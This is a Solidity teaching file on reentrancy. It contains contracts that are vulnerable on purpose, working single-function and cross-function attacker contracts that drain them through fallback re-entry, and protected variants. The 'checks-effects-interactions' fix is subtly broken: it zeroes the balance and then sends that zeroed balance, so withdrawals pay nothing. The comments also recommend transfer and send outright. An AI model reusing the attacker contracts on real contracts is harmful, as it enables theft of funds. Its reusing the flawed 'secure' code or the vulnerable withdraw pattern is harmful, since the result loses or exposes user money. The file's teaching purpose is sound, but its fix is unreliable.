//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
/**
    Secure transfer of ethers
    Solidity provides the following three ways to transfer the ethers from one address to another
    
    Transfer -- This is the latest method introduced after Solidity 0.4.13. This allows exception propogation and forwards a non adjustable gas amount of 2300 which is just enough to log an event.  
    
    Send -- This method allows ethers transfer between addresses and also forwards a non adjustable gas amount of 2300. However, this function misses exception propogation. Therefore, its response must be checked if the transaction executed correctly. 
    
    The main difference between send and transfer method is that the transfer method propagates every exception that is thrown at the receiving address to the sending contract, leading to an automatic revert of all state changes.
    
    Call -- This method is used to invoke functions in other contracts. Additionally, this function could also be used to simply pass certain ethers value from one address to another. Unlike transfer and send methods this method allows a variable gas amount to be sent along with the ethers amount. 

    Due to the fact that the call method sends a variable amount of gas along with the transfer. The receiver contract has the potential to attack the sender contract using an attack vector called the Re-entrancy attack.
    Therefore, only transfer and send should be used to transfer the ether from one address to another. 

    Re-entrancy attack vector: 
        This attack involves two smart contracts. The vulnerable contract on a method call uses call method to transfer some arbitary amount of ether to the attacker contract. The attacker contract inherits some ethers and some gas amount from the vulnerable contract.
        The attacker contract leverages this gas amount to recursively call the same function (single function re-entrancy) or any other function (cross function re-entrancy) inside the vulnerable contract in order to exhaust the vulnerable contract's balance.
    
    The following is a detailed example of how both the single-function and the cross-function re-entrancy can be carried out:
*/

contract VulnerableEtherSender {
    mapping(address => uint256) public balances;
    constructor() payable {
    }
    function deposit(uint _amount) public payable {
        require(_amount == msg.value, "Incorrect Amount");
        balances[msg.sender] += _amount;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function transfer(address to, uint amount) external {
            if (balances[msg.sender] >= amount) {
                balances[to] += amount;
                balances[msg.sender] -= amount;
            }
    }

    function withdraw() public payable {
        require(balances[msg.sender] > 0, "Balance is not enough"); // checks
        // call and transfer the balance 
        (bool sent, ) = payable(msg.sender).call{value: balances[msg.sender]}(""); // interactions
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0; //effects
    }
}

contract AttackerEtherReceiver {
    // deposits ethers into the vulnerable contract 
    VulnerableEtherSender _depositContractAddress;
    constructor(address _depositEthersAddress) {
        _depositContractAddress = VulnerableEtherSender(_depositEthersAddress);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function deposit() public payable {
        require(msg.value == 1 ether, "Exact 1 ether deposit for simple example purposes");
        _depositContractAddress.deposit{value: msg.value}(msg.value);
        _depositContractAddress.withdraw();
    }

    // fallback functions 
    receive() external payable { 
        if(address(_depositContractAddress).balance >= 1 ether) {
            _depositContractAddress.withdraw();
        }
    }
}

/**
    SOLUTIONS

    Checks-Effects-Interactions pattern
    This pattern protects against reentrancy attacks by defining an order for function calls inside the vulnerable method. 

    Reentrancy takes affect becuase proper checks are missing in the VulnerableEtherSender to prevent the attacker from re entering the vulnerable method. Moreover, the state changes (effects) are happening after the call function (interactions)
    It is important to note that the attacker is recursively entering the vulnerable method. Therefore, changing effects before interaction would make sure that attacker would not leverage on unupdated state inside the vulnerable contract. 
    Updading local state before external implementation is key in the prevention of reentrancy attacks.

    Checks : require statements to check the context, conditions, and state variables.
    Effects: Any state updates that this function call results in
    Interaction: Interaction with the outside entity (external contract) necessary for the function execution.

    Single Function Rentrancy Protection
*/
contract ChecksEffectsInteractionProtectedEtherSender {
    mapping(address => uint256) public balances;
    constructor() payable {
    }
    function deposit(uint _amount) public payable {
        require(_amount == msg.value, "Incorrect Amount");
        balances[msg.sender] += _amount;
    }
      
    function withdraw() public payable {
        require(balances[msg.sender] > 0, "Balance is not enough"); // checks
        balances[msg.sender] = 0; //effects
        (bool sent, ) = payable(msg.sender).call{value: balances[msg.sender]}(""); // interactions
        require(sent, "Failed to send Ether");
    }
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
    Although Checks Effects and Interaction pattern helps prevent the single function reentrancy attacks, Cross function reentrancy attacks could be prevented using the Reentrancy Gaurd (Lock/Mutex) approach.
    In this approach, a reentrancy guard is introduce to prevent the attacker from entering the function again. 
    Note function execution is not concurrent in solidity. Therefore, lock can be a boolean instead of a mapping

    Again. It would be better to use openzeppelin's efficient implementations for Reentrancy Guard

    Cross Function Rentrancy protection

    The root cause of cross-function reentrancy attack is typically due to there are multiple functions mutually sharing the same state variable, and some of them update that variable insecurely.
 */

contract CrossFunctionAttacker {
    VulnerableEtherContract vulnerableContract;
    CrossFunctionAttacker public attackPeer;

    constructor(address _vulnerableContract) payable {
        vulnerableContract = VulnerableEtherContract(_vulnerableContract);
    }

    function setAttackPeer(CrossFunctionAttacker _attackPeer) external {
        attackPeer = _attackPeer;
    }
    
    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.transfer(
                address(attackPeer), 
                vulnerableContract.getUserBalance(address(this))
            );
        }
    }

    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        vulnerableContract.deposit{value: 1 ether}(1 ether);
        vulnerableContract.withdraw();
    }

    function attackNext() external {
        vulnerableContract.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract VulnerableEtherContract {
    mapping(address => uint256) public balances;
    bool lock;

    constructor() payable{
        lock = false;
        balances[msg.sender] += msg.value;
    }

    modifier nonReentrant() {
     require(lock == false, "Non Reentrant");
      lock = true;
      _;
      lock = false;
    }

    function transfer(address to, uint amount) external {
        if (balances[msg.sender] >= amount) {
            balances[to] += amount;
            balances[msg.sender] -= amount;
        }
    }

    function deposit(uint _amount) public payable {
        require(_amount == msg.value, "Incorrect Amount");
        balances[msg.sender] += _amount;
    }

    function getUserBalance(address _userAddress) public view returns (uint) {
        return balances[_userAddress];
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdraw() public payable {
        require(balances[msg.sender] > 0, "Balance is not enough"); // checks
        (bool sent, ) = payable(msg.sender).call{value: balances[msg.sender]}(""); // interactions
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0; //effects
    }
}


contract ReentrantGaurdProtectedContract {
    mapping(address => uint256) public balances;
    bool lock;

    constructor() payable{
        lock = false;
        balances[msg.sender] += msg.value;
    }

    modifier nonReentrant() {
     require(lock == false, "Non Reentrant");
      lock = true;
      _;
      lock = false;
    }

    function transfer(address to, uint amount) nonReentrant external {
        if (balances[msg.sender] >= amount) {
            balances[to] += amount;
            balances[msg.sender] -= amount;
        }
    }

    function deposit(uint _amount) public payable {
        require(_amount == msg.value, "Incorrect Amount");
        balances[msg.sender] += _amount;
    }

    function getUserBalance(address _userAddress) public view returns (uint) {
        return balances[_userAddress];
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdraw() public payable nonReentrant{
        require(balances[msg.sender] > 0, "Balance is not enough"); // checks
        (bool sent, ) = payable(msg.sender).call{value: balances[msg.sender]}(""); // interactions
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0; //effects
    }
}
